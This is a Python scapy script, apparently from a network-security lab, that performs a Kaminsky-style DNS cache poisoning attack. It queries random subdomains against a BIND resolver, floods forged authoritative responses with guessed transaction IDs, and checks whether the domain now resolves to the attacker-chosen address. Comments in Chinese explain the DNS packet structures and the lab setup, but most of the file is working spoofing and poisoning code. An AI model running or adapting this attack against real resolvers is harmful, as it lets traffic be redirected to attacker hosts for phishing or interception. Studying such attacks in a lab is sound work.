# -*- coding: utf-8 -*-

#导入一些模块
from scapy.all import *
from scapy.utils import PcapReader
import threading
import random
import time
import re
import os

#检查是否是一个IPv4的地址，附加区还会返回权威服务器IPv6的地址，需要进行区分
def ipv4_addr_check(ipAddr):
    p = re.compile('^((25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(25[0-5]|2[0-4]\d|[01]?\d\d?)$')          #生成一个正则表达式对象p
    if p.match(ipAddr):				#match从字符串开始出进行匹配
        return True
    else:
        return False
'''
^ $，标识匹配字符串开始和结尾的位置
(25[0-5]|2[0-4]\d|[01]?\d\d?)\.   第一块25[0-5]，第一个字符是2,第二个字符是5,第三个字符是0到5,表示250～255
				  第二块2[0-4]\d，第一个字符是2,第二个字符是0到4,第三个字符是任意一位数字，表示200～249
				  第三块，[01]?\d\d，第一个字符是0或者1,或者也可以没有，第二第三个字符是任意一位数字，表示1～199
				  | 表示只要满足三块中其中一块就行，{3}表示重复三次，前三部分结束都有一个. 
'''


#输入要请求的域名，返回负责该zone权威DNS服务器的IP地址列表
def Get_target_IP_list(target_server = "192.168.1.103",domain = "31801.example.com"):           #缺省参数改为好辨识的参数
#伪造一个包，向LDNS请求参数domain的NS记录，便于后续伪造攻击；sr1将得到的一个响应传给ans
    ans = sr1(IP(dst=target_server)/UDP(sport=random.randint(2000,4000), dport=53)/DNS(rd=1,qd=DNSQR(qname=domain,qtype="NS",qclass=1))) 

    IP_list = []
    for i in range(ans.arcount):			#arcount对应DNS响应报文中的ARCOUNT，表示附加区有多少条记录							
        if ipv4_addr_check(ans.ar[i].rdata):            #提取出附加区胶水记录，权威DNS服务器的IPv4地址，有时会夹杂IPv6
            IP_list.append(ans.ar[i].rdata)
    return IP_list
'''
scapy中DNS报文结构
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|             LENGTH            |               ID              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|Q| OPCODE|A|T|R|R|Z|A|C| RCODE |            QDCOUNT            |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|            ANCOUNT            |            NSCOUNT            |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|            ARCOUNT            |               QD              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|               AN              |               NS              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|               AR              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

scapy中DNSQR结构
0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|             QNAME             |             QTYPE             |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|             QCLASS            |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

scapy中DNSRR结构
0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|             RRNAME            |              TYPE             |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|             RCLASS            |              TTL              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                               |             RDLEN             |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|             RDATA             |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

'''
    

#向LDNS发送查询请求报文，要求对应域名的A记录，后续生成随机域名进行攻击
def fake_q(target_server = "192.168.1.103" , domain = "31801.example.com"):
    req =(IP(dst=target_server)/\
          UDP(sport=random.randint(2000,4000), dport=53)/\
          DNS(qr=0, ad=1, qd=DNSQR(qname=domain,  qtype="A", qclass=1)))
        
    send(req)



#为线程定义一个函数，我的虚拟机只分配了一个核心，好像并不能并发执行
#此函数用来检查是否投毒成功
def DNS_QR(target_server = "192.168.1.103",qd = "31801.example.com"):
    ans = sr1(IP(dst=target_server)/UDP(sport=random.randint(2000,4000), dport=53)/DNS(rd=1,qd=DNSQR(qname=qd,qtype="A",qclass=1)),timeout = 5)   
#rd=1,期望LDNS递归查询
    try:						#捕捉异常
        if ans:						#如果有回应，ans不为空
            if ans.an:
                print(ans.an.rdata)			#返回应答区的IP地址，和我们预期投毒的地址比较判断是否成功
                return ans.an.rdata
        else:
            return False
    except:
        print(ans)
        os._exit()
    
    

def DNS_sending(target_server = "192.168.1.103",domain="31801.example.com",iplist=[],times = 500):
    if len(iplist)==0:
        print("no ip!!!")
        return 
    
    ID = []
    for i in range(times): 
        ID.append(i)                                    #伪造的ID只能介于0到times之间，实际的ID有16位0到65535

#伪装成权威DNS服务器，发送虚假的应答
#dport为33333,不用猜，因为我们在named.conf.options文件中规定了LDNS查询时采用的源端口是33333
#投毒为我们上次实验apache服务器的地址，缓存时间7200s
    fake_p = IP(dst=target_server,src=iplist)/\
      UDP(sport=53, dport=33333)/\
      DNS(id=ID,qr=1,ra=1,
          qd=DNSQR(qname=domain,  qtype="A", qclass=1),
          an=DNSRR(rrname=domain,ttl = 7200,rdata="192.168.195.94")
          )
    
    send(fake_p)
        
    

def start_poison(traget_server = "192.168.1.103",traget_domain = "31801.example.com"):
    up_domain = traget_domain[traget_domain.find('.')+1:]				 #获取目标域名的上级权威服务器
    IP_list = Get_target_IP_list(traget_server,up_domain)				 #拿到该zone权威DNS服务器的IP地址列表
    print(IP_list)
    
    trytime = 0
    while(True):
        print(trytime,time.strftime("%Y %m %d %X", time.localtime()))
        
        rand1 = random.randint(1,10000000)						
        rand_domain = str(rand1) +"."+ up_domain
        print (rand_domain)								#随机数.example.com
        
        t1 = threading.Thread(target=fake_q, args=(traget_server,rand_domain,), daemon=True)		#创建一个线程向LDNS发送随机域名A记录的解析请求
        t1.start() 											#开始执行线程,两个线程并行执行
        t1.join()  											#等待线程执行完
       
        DNS_sending(traget_server,rand_domain,IP_list,50)						#伪造权威DNS服务器发送响应，ID只能介于0-50之间	

 
        answer = DNS_QR(traget_server,rand_domain)							#我们再次请求这个域名的A记录
        print (answer)
        if (answer=="192.168.195.94"):									#如果解析结果是我们投毒的结果，说明成功了
            print("成功!!!!")
            os._exit()
        else:
            print("失败!!!!")
        
        trytime += 1

    return 


traget_DNS_server = "192.168.195.94"			#我们配置bind9的那台DNS服务器的IP地址
traget_domain = "www.example.com"                       #要攻击的域名


start_poison(traget_DNS_server,traget_domain)


